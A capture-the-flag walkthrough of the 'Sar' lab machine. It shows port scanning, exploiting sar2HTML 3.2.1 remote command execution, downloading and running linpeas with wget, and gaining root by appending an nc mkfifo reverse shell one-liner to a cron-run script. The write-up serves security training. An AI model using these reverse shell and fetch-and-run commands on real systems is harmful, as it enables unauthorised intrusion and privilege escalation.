# Sar Walkthrough
Hello Hackers!

This is f33z, and Today i will share with you my walkthrough on how i solved the machine Sar in the Prouving Ground machines, This is exactly in the play section

## Port Scanning
Port scanning is my way to know open ports in this machine, and nmap is our friend
```bash
nmap -p- -T4 -v [IP-ADDRESS]
```
this revealed that there are two open ports : 22, 80
to check which services are running in these open ports, we run nmap with -sC and -sV
```bash
nmap -p22,80 -sC -sV [IP-ADDRESS]
```
and As expected, this machine is running a web server in port 80, and a ssh in the port 22.

## Enumeration
Since The version of ssh doesnt seem old and also we dont know the credentials to use to login to SSH, then we will start with port 80
### port 80 - HTTP
The root directory of the website was the default page of apache server, since we know there is a robots.txt file as we saw in the nmap results 

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/e3ed9372-6738-430a-91ab-8317fdaf566f)

We got `sar2HTML` string and after searching we found that this is a CMS, this CMS is deployed in http://[IP-ADDRESS]/sar2HTML

## Initial Access
Since this is the version 3.2.1, it is vulnerable to [Remote Command Execution](https://www.exploit-db.com/exploits/47204)

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/8286fe94-3695-43ac-8f37-99da53df91bc)

After understanding the exploit, I applied it on our machine : and yes we got the output of `id` after clicking on the `host`

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/d1ad8db8-c454-4bda-a9d5-630c6a6247d7)

To get an Initial Access to the webserver, we will be be getting a reverse shell from [this](https://www.revshells.com/) website, the reverse shell that i chose is `nc mkfifo` and i set the IP ADDRESS and the port

I used Burpsuite so i can encode my payload by clicking `CTRL+u`

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/f4a1ff9b-8092-4770-9312-20ad71f04904)


I also set a listener on the same port 
```bash
nc -nlvp 9001
```
And YUUUP we got initial access as www-data user

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/2f4f4a71-00e7-47ad-9be8-bda57c06fad0)


## Privilege Escalation
To Escalate from www-data user privileges to higher privileges, I uplaoded the linpeas script to the machine
in my kali linux :
```bash
python3 -m http.server 80
```
in the Sar machine
```bash
cd /tmp
wget http://IP-ADDRESS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
After Going through the output of linpeas, i found that there is a cronjob running in this machine

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/ed6a0a2c-c584-49b2-b98f-a7c2ca97cfd5)

After checking the content of `finally.sh` script, I found that it runs another script in the same directory called `write.sh`, we dont have write permissions in the file `finally.sh` but we have them in the file `write.sh`

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/aa7379af-b888-40d1-a16f-3e79fe158b88)

So we can create a reverse shell as we did earlier for getting initial access and write that reverse shell into `write.sh`

in Sar machine : 
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.216 9002 >/tmp/f' >> write.sh
```
in the Kali linux machine :
```bash
nc -nlvp 9002
```

After waiting 5 min, because that's the time in the cron, to get more understanding of cronjob format :

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/7fa2fd43-568e-4da8-85ec-002c0f522fe1)

within 5 min we goot a response in the netcat listener!

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/e16647b7-e1b3-4e70-b7ac-7b97bf95b092)


and Guess what we are GROOT!!

![Uploading image.png…]()









